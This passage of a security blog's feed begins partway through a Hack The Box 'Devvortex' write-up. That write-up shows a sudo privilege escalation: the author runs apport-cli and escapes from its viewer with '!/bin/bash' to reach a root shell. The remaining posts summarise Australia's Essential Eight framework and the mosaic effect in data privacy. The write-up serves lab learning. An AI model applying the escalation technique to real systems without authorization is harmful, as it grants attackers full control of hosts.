  <span class="nt">-u</span> UPDATE_REPORT, <span class="nt">--update-bug</span><span class="o">=</span>UPDATE_REPORT
                        Start <span class="k">in </span>bug updating mode. Can take an optional
                        <span class="nt">--package</span><span class="nb">.</span>
  <span class="nt">-s</span> SYMPTOM, <span class="nt">--symptom</span><span class="o">=</span>SYMPTOM
                        File a bug report about a symptom. <span class="o">(</span>Implied <span class="k">if </span>symptom
                        name is given as only argument.<span class="o">)</span>
  <span class="nt">-p</span> PACKAGE, <span class="nt">--package</span><span class="o">=</span>PACKAGE
                        Specify package name <span class="k">in</span> <span class="nt">--file-bug</span> mode. This is
                        optional <span class="k">if </span>a <span class="nt">--pid</span> is specified. <span class="o">(</span>Implied <span class="k">if </span>package
                        name is given as only argument.<span class="o">)</span>
  <span class="nt">-P</span> PID, <span class="nt">--pid</span><span class="o">=</span>PID     Specify a running program <span class="k">in</span> <span class="nt">--file-bug</span> mode. If this
                        is specified, the bug report will contain more
                        information.  <span class="o">(</span>Implied <span class="k">if </span>pid is given as only
                        argument.<span class="o">)</span>
  <span class="nt">--hanging</span>             The provided pid is a hanging application.
  <span class="nt">-c</span> PATH, <span class="nt">--crash-file</span><span class="o">=</span>PATH
                        Report the crash from given .apport or .crash file
                        instead of the pending ones <span class="k">in</span> /var/crash. <span class="o">(</span>Implied <span class="k">if
                        </span>file is given as only argument.<span class="o">)</span>
  <span class="nt">--save</span><span class="o">=</span>PATH           In bug filing mode, save the collected information
                        into a file instead of reporting it. This file can
                        <span class="k">then </span>be reported later on from a different machine.
  <span class="nt">--tag</span><span class="o">=</span>TAG             Add an extra tag to the report. Can be specified
                        multiple times.
  <span class="nt">-v</span>, <span class="nt">--version</span>         Print the Apport version number.

</code></pre></div></div> <p>With <code class="language-plaintext highlighter-rouge">sudo /usr/bin/apport-cli -f</code> the utility enters the <strong>File a bug</strong> mode to first attempt submitting a bug to understand how the utility works.</p> <p>At the end, of the submission is an option to view the report.</p> <p><img src="/assets/img/20240115-devvortext-apportuse.png" alt="20240115-devvortext-apportuse.png" class="auto-resize"/></p> <p>The screen that follows opens in a <code class="language-plaintext highlighter-rouge">vim</code> style editor.</p> <p><img src="/assets/img/20240115-devvortext-apportshell.png" alt="20240115-devvortext-apportshell.png" class="auto-resize"/></p> <p>Passing a shell to it by typing <code class="language-plaintext highlighter-rouge">!/bin/bash</code> may, theoretically, launch a new shell under the sudo privileges from which the utility is being ran.</p> <p>and it does!</p> <p><img src="/assets/img/20240115-devvortext-rootflag.png" alt="20240115-devvortext-rootflag.png" class="auto-resize"/></p>]]></content><author><name></name></author><category term="HTB-Machines"/><category term="easy-box"/><category term="HTB"/><category term="CTF"/><category term="credential-stuffing"/><category term="information-disclosure"/><category term="password-cracking"/><summary type="html"><![CDATA[Devvortex - Hack The Box walkthrough.]]></summary></entry><entry><title type="html">Essential Eight Maturity Model annual update</title><link href="https://emdeh.github.io/blog/2023/update-to-essential-eight/" rel="alternate" type="text/html" title="Essential Eight Maturity Model annual update"/><published>2023-11-27T16:00:00+00:00</published><updated>2023-11-27T16:00:00+00:00</updated><id>https://emdeh.github.io/blog/2023/update-to-essential-eight</id><content type="html" xml:base="https://emdeh.github.io/blog/2023/update-to-essential-eight/"><![CDATA[<h2 id="introduction">Introduction</h2> <p>As mentioend in <a href="https://emdeh.com/news/announcement_7"> this news item</a>, the updates draw upon various sources, including cyber threat intelligence, feedback from government and industry sectors globally, insights from penetration tests, Essential Eight assessments, uplift activities, and responses to ASD’s annual cyber survey.</p> <p>Key areas of focus in the latest update include:</p> <ol> <li>Balancing patching timeframes to ensure timely response to vulnerabilities.</li> <li>Increasing the adoption of phishing-resistant multifactor authentication to enhance security.</li> <li>Improving the management of cloud services, considering their growing importance and unique security challenges.</li> <li>Enhancing incident detection and response capabilities, particularly for internet-facing infrastructure, to quickly identify and mitigate potential breaches.</li> </ol> <p>The following summarises the for each maturity level.</p> <h2 id="maturity-level-one-updates">Maturity Level One updates</h2> <ol> <li>Patch Applications: Tightens response times for critical vulnerabilities and increases frequency of vulnerability scanning for high-risk software.</li> <li>Patch Operating Systems: Similar changes as for applications, emphasizing quicker responses for critical vulnerabilities.</li> <li>Multi-Factor Authentication (MFA): Removes opt-out option for certain online services and adds new requirements for MFA implementation.</li> <li>Restrict Administrative Privileges: Introduces validation for privileged access requests and limits internet access for privileged accounts.</li> <li>Application Control: Shifts from using NTFS permissions to employing application control solutions.</li> <li>User Application Hardening: Focuses on disabling or removing Internet Explorer 11 and logging command line process creation events.</li> <li>Regular Backups: No significant change.</li> </ol> <h2 id="maturity-level-two-updates">Maturity Level Two updates</h2> <p>Maturity Level Two implements the same changes as Level One, with additional changes:</p> <ol> <li>Phishing-resistant MFA for various user authentication scenarios.</li> <li>Centralised event log retention and monitoring for signs of compromise.</li> <li>Mandatory incident reporting and response plan enactment.</li> <li>Application control rule validation and Microsoft’s recommended application blocklist implementation.</li> </ol> <h2 id="maturity-level-three-udpates">Maturity Level Three udpates</h2> <p>Level Three includes Level One and Two changes, with the following additional requirements:</p> <ol> <li>Additional requirements for patching drivers and firmware.</li> <li>Enhanced administrative privilege restrictions, including the use of Secure Admin Workstations and enhanced Windows security features.</li> <li>Specific requirements for handling Microsoft Office macros, including digital signing and checking for malicious code.</li> </ol> <h2 id="useful-resources">Useful resources</h2> <ul> <li><a href="https://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/essential-eight/essential-eight-maturity-model-changes"> Essential Eight Maturity Model Changes</a></li> </ul>]]></content><author><name></name></author><category term="Essential-Eight"/><category term="ACSC"/><category term="PSPF"/><category term="ASD"/><category term="ACSC"/><summary type="html"><![CDATA[The November 2023 update of the Essential Eight Maturity Model introduces several changes across three maturity levels.]]></summary></entry><entry><title type="html">Assessment planning and scoping</title><link href="https://emdeh.github.io/blog/2023/assessment-planning-scoping/" rel="alternate" type="text/html" title="Assessment planning and scoping"/><published>2023-11-24T11:00:00+00:00</published><updated>2023-11-24T11:00:00+00:00</updated><id>https://emdeh.github.io/blog/2023/assessment-planning-scoping</id><content type="html" xml:base="https://emdeh.github.io/blog/2023/assessment-planning-scoping/"><![CDATA[<h2 id="introduction">Introduction</h2> <p>The planning and scoping stages of an assessment are essential for structuring the process and ensuring that the security insights gained accurately represent the environment being assessed. It’s vital to take into account the context in which an organisation operates, including the threat landscape during this stage. In this context, the threat landscape can mean the primary threat the organisation is facing. For example, insider threats or external threats - including the level of threat sophistication.</p> <p>Assessors should examine the organisation’s policies and procedures, conduct comprehensive tests of technical controls pertinent to each strategy, and assess their effectiveness. Determining the desired maturity level of the organization under assessment is key to guiding the assessment and establishing the appropriate scope and methods.</p> <p>The type and quality of evidence collected will play a role in the assessment outcomes, so it’s critical to ensure that the evidence gathered is of high quality and reliable as this will underpin the report’s conclusions and recommendations.</p> <p>When there are mandatory requirements for the implementation of the Essential Eight, there is a need for assessment to attest the level of maturity of the organisation’s cyber security controls. The assessment process, however, is intended to provide an organisation with actionable insights. For this reason, organisations who do not have a mandated requirement, will still find regular assessment helpful as a way to identify improvements.</p> <blockquote> <p><strong><em>Non-corporate entities within the Australian Government are typically required to obtain a Maturity Level Two within the broader context of the mandatory Protective Security Policy Framework (PSPF).</em></strong></p> </blockquote> <p>The following sections describe the four assessment stages.</p> <h2 id="stage-1---assessment-planning-and-preparation">Stage 1 - Assessment planning and preparation</h2> <p>During this stage pre-planning is undertaken to build a contextual overview of the organisation and the threat landscape it operates in. The assessor will aim to gain an understanding of the infrastructure, the teams the assessor will need to interact with, and the skills required to complete the assessment.</p> <p>As part of planning, the assessor should discuss the following with the asset owner:</p> <ul> <li>Determine asset classification and assessment scope.</li> <li>Requirements around access to low and high-privileged user accounts, devices, documentation, personnel, and facilities.</li> <li>Any approvals required to run scripts and tools within the environment.</li> <li>Evidence collection and protection requirements, including following the conclusion of the assessment.</li> <li>Finalising approval to use tools and scripts on sample systems/servers/networks.</li> <li>Requirements for where the assessment report will be developed (e.g. on the organisation’s system or externally).</li> <li>How stakeholder engagement and consultation should be approached, including confirming key points of contact.</li> <li>Whether any managed service providers support or manage any aspects of the system(s) under assessment; including appropriate points of contact if so.</li> <li>Obtaining copies of any previously completed assessment reports for the system.</li> <li>Agreement on appropriate use, retention and marketing of the assessment report by both parties.</li> </ul> <p>At the end of this stage, the assessor should have developed the assessment test plan.</p> <h2 id="stage-2---assessment-scoping">Stage 2 - Assessment scoping</h2> <p>Different maturity levels will impact aspects or components of the assessment. During this stage the assessor should become familiar with the requirements for the target maturity level, so the assessment approach and test plan can be adjusted accordingly.</p> <blockquote> <p><strong><em>The Essential Eight should be implemented and assessed as a package. If a system has not previously been assessed and demonstrated to meet Maturity Level One, that system should not be assessed for Maturity Level Two. Likewise, a system should be assessed and demonstrated to meet Maturity Level Two before being assessed for Maturity Level Three.</em></strong></p> </blockquote> <p>As part of determining the appropriate assessment approach, the assessor should conduct the following activities:</p> <ul> <li>Make use of asset registers that describe the environment to determine the applicability of the Essential Eight.</li> <li>Conduct workshops with the system owners to identify and agree on the precise assessment scope, including out-of-scope items.</li> <li>Agree with system owners on the assessment duration and milestones.</li> <li>Obtain an approximate breakdown of the operating systems used within the environment.</li> <li>Determine the necessary sample size to accurately represent all in-scope assets and types of assets.</li> <li>Document any assessment limitations, including sample sizes and constraints in the assessment report.</li> </ul> <h3 id="evidence-quality">Evidence quality</h3> <p>Assessments should strive to gather and use the highest calibre of evidence to effectively support the conclusions on the effectiveness of controls. Evidence quality requirements should be considered and discussed at this stage.</p> <p>It’s important to use a mix of both qualitative and quantitively techniques, as these will often complement each other and allow for cross-referencing. Qualitative techniques may included reviewing documentation and interviewing system administrators. Quantitative techniques could include reviewing system configurations or utilising tools and scripts.</p> <p>When conducting assessments, the quality of evidence can typically be categorised as follows:</p> <table> <thead> <tr> <th>Quality</th> <th>Description</th> </tr> </thead> <tbody> <tr> <td>Excellent evidence</td> <td>Testing a control with a simulated activity that is designed to validate it is implemented <em>and</em> effective (e.g. attempting to run an application to check application control rulesets).</td> </tr> <tr> <td>Good evidence</td> <td>Review configuration settings of a system <em>through the system’s interface</em> (not screenshots or as-built documentation) to determine whether it a control should theoretically be enforced.</td> </tr> <tr> <td>Fair evidence</td> <td>Review a copy of a system’s configuration (e.g. using reports or screenshots) to determine whether it should enforce an expected control.</td> </tr> <tr> <td>Poor evidence</td> <td>A policy or verbal statement of intent (e.g. sighting mention of controls within artefacts such as as-built documents).</td> </tr> </tbody> </table> <p><br/></p> <h2 id="stage-3---assessment-of-controls">Stage 3 - Assessment of controls</h2> <p>At this stage the effectiveness of the controls within the Essential Eight are tested against the target Maturity Level.</p> <p>ACSC ahs developed standardised assessment outcomes which must be used.</p> <p>Each control can be assessed as:</p> <ul> <li><strong>Effective</strong>: The organisation is effectively meeting the control’s objective.</li> <li><strong>Ineffective</strong>: The organisation is not adequately meeting the control’s objective.</li> <li><strong>Alternate control:</strong> The organisation is effectively meeting the control’s objective through an alternate control.</li> <li><strong>Not assessed:</strong> The control has not yet been assessed.</li> <li><strong>Not applicable:</strong> The control does not apply to the system or environment.</li> <li><strong>No visibility:</strong> The assessor was unable to obtain adequate visibility of a control’s implementation.</li> </ul> <p>Importantly, the Essential Eight Maturity Model does not allow for risk acceptance without compensating controls. If a system owner has accepted a risk with no compensating controls, the mitigation strategy must be considered not implemented.</p> <p>Moreover, when evaluating the efficacy of compensating controls, it’s important to verify that the level of protection the compensating control(s) offer is commensurate to that prescribed by the Essential Eight to protect against the level of adversarial tradecraft for the target Maturity Level.</p> <blockquote> <p><strong><em>There is no scope in the Essential Eight model that allows for risks to be accepted without commensurate compensating controls.</em></strong></p> </blockquote> <h2 id="stage-4---development-of-the-assessment-report">Stage 4 - Development of the assessment report</h2> <p>In the final stage, the assessor will develop the security assessment report.</p> <h3 id="understanding-maturity-levels">Understanding maturity levels.</h3> <p>The report will contextualise the assessment against the Maturity Model. The Maturity Model contains four levels that provide a way for an organisation to measure its progress in implementing the Essential Eight while also identifying areas for improvement.</p> <p>There are three target levels, based on increasingly sophisticated levels of adversarial tradecraft. Level 0 exists for designating instances where the requirements of the first maturity level are not met.</p> <p>At <strong>Maturity Level 0</strong> weaknesses exist in the overall cyber security posture. This is also the default starting position if no assessment has been done previously.</p> <p>At <strong>Maturity Level One</strong> the focus is on protection against malicious actors who are content to simply leverage widely available tradecraft. This level maturity does not offer protection against APT tradecraft or other persistent threats, including insider threats.</p> <p>At <strong>Maturity Level Two</strong> a level of protection is reached that is sufficient to mitigate threats from malicious actors who are willing to invest more time in a target and in the effectiveness of their tools.</p> <p>At <strong>Maturity Level Three</strong> the focus is on threats who are more adaptive and much less reliant on public tools and techniques, such as state-sponsored actors, military operations, other APTs.</p> <h3 id="report-validity">Report validity</h3> <p>There’s no expiry date on the assessment report. Theoretically an assessment could be indefinite but assessors should be cautious of relying on previous report that are aged, and should consider doing a gap analysis to determine any deviations from succeeding changes to the Essential Eight, as well as changes within the environment itself.</p> <h3 id="treatment-and-exceptions">Treatment and exceptions</h3> <p>The use of exceptions for a system need to be documented and approved by an appropriate authority through a formal process. For government entities, the appropriate authority may be defined in the broader PSPF.</p> <p>Documentation for exceptions should include the scope and justification for the exception, as well as the following detail of the compensating controls:</p> <ul> <li>Reason, scope, and justification for compensating controls.</li> <li>Anticipated implementation lifetime of the compensating control(s).</li> <li>The review schedule of the compensating control.</li> <li>The system risk rating before and after the compensating control was implemented.</li> <li>Any caveats around the use of the system because of the exception.</li> <li>The formal acceptance from the appropriate authority of any residual risk for the system.</li> <li>When the need for the exception will next be considered by the appropriate authority, noting exceptions should not be approved beyond one year.</li> </ul> <h2 id="useful-resources">Useful resources</h2> <ul> <li><a href="https://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/essential-eight/essential-eight-assessment-process-guide">Essential Eight Assessment Process Guide | Cyber.gov.au</a></li> <li><a href="https://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/essential-eight/essential-eight-maturity-model">Essential Eight Maturity Model | Cyber.gov.au</a></li> <li><a href="https://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/essential-eight/essential-eight-maturity-model-faq">Essential Eight Maturity Model FAQ | Cyber.gov.au</a></li> </ul>]]></content><author><name></name></author><category term="Essential-Eight"/><category term="ACSC"/><category term="PSPF"/><category term="ASD"/><category term="ACSC"/><summary type="html"><![CDATA[The four stages of assessment]]></summary></entry><entry><title type="html">Overview of Essential Eight</title><link href="https://emdeh.github.io/blog/2023/overview-of-essential-eight/" rel="alternate" type="text/html" title="Overview of Essential Eight"/><published>2023-11-20T23:50:00+00:00</published><updated>2023-11-20T23:50:00+00:00</updated><id>https://emdeh.github.io/blog/2023/overview-of-essential-eight</id><content type="html" xml:base="https://emdeh.github.io/blog/2023/overview-of-essential-eight/"><![CDATA[<h2 id="introduction">Introduction</h2> <p>Sometimes it’s helpful to contextualise what something <em>isn’t.</em> That is certainly the case with the Australian Signals Directorate’s <strong>Essential Eight</strong> <em>Strategies to Mitigate Cyber Security Incidents</em>.</p> <p>Often the Essential Eight and its Maturity Model are conflated with the Australian Government’s broader <em>Protective Security Policy Framework (PSPF),</em> which has its own Maturity Model.</p> <p>So, to begin lets set the scene.</p> <h3 id="where-did-the-essential-eight-come-from">Where did the Essential Eight come from?</h3> <p>In February 2010, the <em>Strategies to Mitigate Cyber Security Incidents</em> was published as an attempt to summaries the <em>Information Security Manual.</em> Seven years later a revision added a degree of relative security effectiveness to these 37 strategies. Eight of these were marked <em>Essential</em>, thus giving rise to the Essential Eight.</p> <p>Notably, the Essential Eight are not the <em>Easy Eight</em>. Nor is it the minimum needed for an effective cyber security posture. Instead, see it as a prioritisation. If you’re not sure where to start on a cyber security program of work, start with the Essential Eight.</p> <p>Indeed, the PSPF is quite explicit abbot this. <em>Policy 10: Safeguarding data from cyber threats</em> states that entities must mitigate common cyber threats by implementing the Essential Eight and considering what remaining 29 strategies need to be implemented to achieve an acceptable level of residual risk.</p> <blockquote> <p><strong><em>The Essential Eight is not all that you need to do. Policy 10 creates a requirement for entities to consider what remaining mitigation strategies they need to achieve an acceptable level of residual risk.</em></strong></p> </blockquote> <h3 id="whos-it-for">Who’s it for?</h3> <p>The Essential Eight is not designed for all environments. It focuses on Microsoft Windows environments and may not be as relevant for other settings, such as IoT or Operational Technology.</p> <p>Increasingly, government directives and legislative instruments are mandating the application of the Essential Eight as a risk management program.</p> <ul> <li>The PSPF mandates it for most government entities at the Federal level</li> <li>Some state governments have mandated it including, Victoria, Queensland, and New South Wales.</li> <li>Entities designated as Critical Infrastructure (Security of Critical Infrastructure Act 2018)</li> </ul> <h2 id="categorising-the-37-strategies">Categorising the 37 strategies</h2> <p>The strategies are categorised into five types:</p> <ol> <li>Preventing Malware delivery and execution.</li> <li>Limiting the extent of Cyber Security Incidents.</li> <li>Detecting Cyber Security Incidents and responding.</li> <li>Recovering data and system availability after a Cyber Security incident.</li> <li>Preventing malicious insiders.</li> </ol> <div class="row"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" media="(max-width: 480px)" srcset="/assets/img/20231120-strategiestomitigatecybersecurityincidents-480.webp"/> <source class="responsive-img-srcset" media="(max-width: 800px)" srcset="/assets/img/20231120-strategiestomitigatecybersecurityincidents-800.webp"/> <source class="responsive-img-srcset" media="(max-width: 1400px)" srcset="/assets/img/20231120-strategiestomitigatecybersecurityincidents-1400.webp"/> <img src="/assets/img/20231120-strategiestomitigatecybersecurityincidents.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" title="Strategies to Mitigate Cyber Secyurity Incidents" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption"> Source: <a href="https://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/strategies-mitigate-cyber-security-incidents"> cyber.gov.au </a> </div> <p>The strategies are also tagged against three further dimensions:</p> <ol> <li>Potential User Resistance</li> <li>Upfront cost</li> <li>Ongoing maintenance cost</li> </ol> <p>How these dimensions were baselined isn’t clear; presumably it’s relative.</p> <p>For the Essential Eight there are:</p> <ul> <li>Four <em>preventing</em> strategies.</li> <li>Three <em>limiting</em> strategies.</li> <li>One <em>recovering</em> strategy.</li> </ul> <h2 id="where-to-start">Where to start?</h2> <p>Logically, the advice is to follow a risk-based approach and start with strategies that mitigate the threats of most concern. This will look different for different organisations. The <em>Strategies to Mitigate Cyber Security Incidents</em> decompose this into the four following categories.</p> <h3 id="targeted-cyber-intrusions-and-other-external-malicious-actors-who-steal-data">Targeted cyber intrusions and other external malicious actors who steal data.</h3> <h4 id="step-1">Step 1</h4> <p>In this category, the first step is to implement the essential mitigation strategies that: a. prevent malware payload delivery and execution, b. limit the extent of cyber security incidents, and c. recover data and system availability.</p> <p><strong>Step 1 implementation order:</strong></p> <ol> <li>Application Control</li> <li>Patch Applications</li> <li>Configure Microsoft Office macro settings</li> <li>User application hardening</li> <li>Restrict administrative privileges</li> <li>Patch operating systems</li> <li>Multi-factor authentication</li> <li>Regular backups</li> </ol> <h4 id="step-2">Step 2</h4> <p>Next, repeat the first step for the strategies with an effectiveness rating of ‘excellent’ in the detect, preventative, and limiting categories.</p> <p><strong>Step 2 implementation order:</strong></p> <ol> <li>Continuous incident detection and response</li> <li>Automated dynamic analysis of email and web content run in a sandbox.</li> <li>Email content filtering</li> <li>Web content filtering</li> <li>Deny corporate computers direct internet connectivity</li> <li>Operating system generic exploit mitigation</li> <li>Disable local administrator accounts</li> <li>Network segmentation</li> <li>Protect authentication credentials</li> </ol> <h4 id="step-3">Step 3</h4> <p>Lastly, consider what remaining strategies are requires to achieve an acceptable level of residual risk.</p> <h3 id="ransomware-and-external-malicious-actors-who-destroy-data">Ransomware and external malicious actors who destroy data</h3> <h4 id="step-1-1">Step 1</h4> <p>For this category, the first step is to implement the Essential Eight that: a. recover data and system availability, b. prevent malware payload delivery and execution, and b. limit the extent of cyber security incidents.</p> <p><strong>Step 1 implementation order:</strong></p> <ol> <li>Regular backups</li> <li>Application Control</li> <li>Patch Applications</li> <li>Configure Microsoft Office macro settings</li> <li>User application hardening</li> <li>Restrict administrative privileges</li> <li>Patch operating systems</li> <li>Multi-factor authentication</li> </ol> <h4 id="step-2-1">Step 2</h4> <p>Next, repeat the first step for the strategies with an effectiveness rating of ‘excellent’ in the detecting, preventative, and limiting categories.</p> <p><strong>Step 2 implementation order:</strong></p> <ol> <li>Continuous incident detection and response</li> <li>Automated dynamic analysis of email and web content run in a sandbox.</li> <li>Email content filtering</li> <li>Web content filtering</li> <li>Deny corporate computers direct internet connectivity</li> <li>Operating system generic exploit mitigation</li> <li>Disable local administrator accounts</li> <li>Network segmentation</li> <li>Protect authentication credentials</li> </ol> <h4 id="step-3-1">Step 3</h4> <p>Lastly, consider what remaining strategies are requires to achieve an acceptable level of residual risk.</p> <h3 id="malicious-insiders-who-steal-data">Malicious insiders who steal data.</h3> <h4 id="step-1-and-2">Step 1 and 2</h4> <p>For this category, the first step is to implement data exfiltration by implementing the strategy <em>‘Control removable storage media and connected devices’</em>. Second is to implement the limiting strategy: <em>Outbound web and email data loss prevention’.</em></p> <p><strong>Step 1 and 2 implementation order:</strong></p> <ol> <li>Control removable storage media and connected devices.</li> <li>Outbound web and email data loss prevention.</li> </ol> <h4 id="step-3-2">Step 3</h4> <p>Next is to implement the Essential Eight <em>limiting</em> strategies, as well as those that allow <em>detection and response</em>.</p> <p><strong>Step 3 implementation order:</strong></p> <ol> <li>Restrict administrative privileges</li> <li>Patch operating systems</li> <li>Multi-factor authentication</li> <li>Continuous incident detection and response</li> </ol> <h4 id="step-4">Step 4</h4> <p>Then repeat the third step for strategies that have an effectiveness rating of excellent in the limiting category and also implement the preventative strategy of Personnel Management.</p> <p><strong>Step 4 implementation order:</strong></p> <ol> <li>Disable local administrator accounts</li> <li>Network segmentation</li> <li>Protect authentication credentials</li> <li>Personnel management</li> </ol> <h4 id="step-5">Step 5</h4> <p>Lastly, if employees are likely to have the technical cyber security capabilities, implement the remaining Essential Eight strategies to prevent malware delivery, then repeat step 3 with less effective mitigation strategies to achieve an acceptable level of residual risk.</p> <p><strong>Step 5 implementation order:</strong></p> <ol> <li>Application Control</li> <li>Patch Applications</li> <li>Configure Microsoft Office macro settings</li> <li>User application hardening</li> </ol> <h3 id="malicious-insiders-who-destroy-data-and-prevent-systems-functioning">Malicious insiders who destroy data and prevent systems functioning.</h3> <h4 id="step-1-2">Step 1</h4> <p>For this category, the first step is to implement the Essential Eight that: a. recover data and system availability, and b. limit the extent of cyber security incidents.</p> <p><strong>Step 1 implementation order:</strong></p> <ol> <li>Regular backups</li> <li>Restrict administrative privileges</li> <li>Patch operating systems</li> <li>Multi-factor authentication</li> </ol> <h4 id="step-2-2">Step 2</h4> <p>Next, repeat the first step for the strategies with an effectiveness rating of ‘excellent’ in the detecting and limiting categories.</p> <p><strong>Step 2 implementation order:</strong></p> <ol> <li>Continuous incident detection and response</li> <li>Disable local administrator accounts</li> <li>Network segmentation</li> <li>Protect authentication credentials</li> </ol> <h4 id="step-3-3">Step 3</h4> <p>Next, implement the preventative strategy of Personnel Management and, again, if employees are likely to have the technical cyber security capabilities, implement the remaining Essential Eight strategies to prevent malware delivery, then repeat step 3 with less effective mitigation strategies to achieve an acceptable level of residual risk.</p> <p><strong>Step 3 implementation order:</strong></p> <ol> <li>Personnel Management</li> <li>Application Control</li> <li>Patch Applications</li> <li>Configure Microsoft Office macro settings</li> <li>User application hardening</li> </ol> <h2 id="where-to-start-1">Where to start</h2> <p>When implementing a strategy, first implement for high risk users and computers such as those who access to important data and/or are exposed to untrustworthy internet content. Then implement it for all other users and computers.</p> <h2 id="useful-resources">Useful resources</h2> <ul> <li><a href="https://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/essential-eight"> Essential Eight | Cyber.gov.au</a></li> <li><a href="https://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/strategies-mitigate-cyber-security-incidents"> Strategies to Mitigate Cyber Security Incidents | Cyber.gov.au </a></li> <li><a href="https://www.protectivesecurity.gov.au/policies"> Policies | Protective Security Policy Framework </a></li> <li><a href="https://www.protectivesecurity.gov.au/publications-library/policy-10-safeguarding-data-cyber-threats"> Policy 10: Safeguarding data from cyber threats | Protective Security Policy Framework </a></li> </ul>]]></content><author><name></name></author><category term="Essential-Eight"/><category term="ACSC"/><category term="PSPF"/><category term="ASD"/><category term="ACSC"/><summary type="html"><![CDATA[Where did the Essential Eight come from, and who's it for?]]></summary></entry><entry><title type="html">The Mosaic Effect</title><link href="https://emdeh.github.io/blog/2023/mosaic-effects/" rel="alternate" type="text/html" title="The Mosaic Effect"/><published>2023-11-08T23:50:00+00:00</published><updated>2023-11-08T23:50:00+00:00</updated><id>https://emdeh.github.io/blog/2023/mosaic-effects</id><content type="html" xml:base="https://emdeh.github.io/blog/2023/mosaic-effects/"><![CDATA[<p>An older post resurrected from another platform, because it will always be relevant.</p> <p>Despite the more high-profile breaches of late, the impact of the mosaic effect remains understated. This <h ref="https://www.abc.net.au/news/2023-05-18/data-breaches-your-identity-interactive/102175688">interactive article&lt;/a&gt; from the ABC and the creator of <h ref="https://haveibeenpwned.com/">';--have i been pwned?&lt;/a&gt; visually (and scarily) gets the point across with - well, mosaics! A timely reminder to minimise the PII we give out and not to re-use passwords.</h></h></p> <h1 id="what-is-the-mosaic-effect">What is the Mosaic Effect?</h1> <p>The mosaic effect demonstrates how seemingly innocuous pieces of information, when combined, can create a detailed and revealing picture of an individual’s identity, much like tiles forming a complete mosaic. Each data breach, no matter how insignificant it may seem, can contribute another tile to this unintended portrait. This piecemeal approach to data collection and the subsequent risk of re-identification in data sets that were thought to be anonymous or de-identified is an increasingly prominent concern in the digital age.</p> <p>The risk also extends beyond the individual and into organizations. Inadvertent disclosure of sensitive information through various seemingly harmless data releases can lead to security vulnerabilities, making companies an unwitting participant in this digital patchwork of information.</p> <h1 id="what-can-you-do">What can you do?</h1> <p>Aside from minimising the PII and not re-using passwords, the more cautious among us may want to consider using masked emails and pseudo-anonymising your PII for online services.</p> <p>Masked emails are aliases that forward to your real email, helping keep your actual email address out of the public domain. This can be a valuable tool in combating phishing attempts. Pseudo-anonymising data, or replacing private identifiers with fake identifiers or pseudonyms, can reduce the risk of identity theft or data misuse.</p> <p>Password managers are more than just convenience tools; they’re a crucial component in the fight against the mosaic effect. They encourage strong, unique passwords for every account and service, making it difficult for attackers to piece together your digital identity even if they gain access to one set of credentials.</p> <p>The mosaic effect underscores the need for a proactive approach to data privacy. By being vigilant about the data we share and how we protect it, we can thwart the efforts of those who seek to piece together our digital lives. Protecting our real identities only takes a little effort but can have a profound impact on our digital security and privacy.</p>]]></content><author><name></name></author><category term="Explainers"/><category term="security-awareness"/><category term="awareness"/><category term="education"/><category term="mosaic-effect"/><category term="PII"/><category term="passwords"/><summary type="html"><![CDATA[See your identity pieced together from stolen data.]]></summary></entry></feed>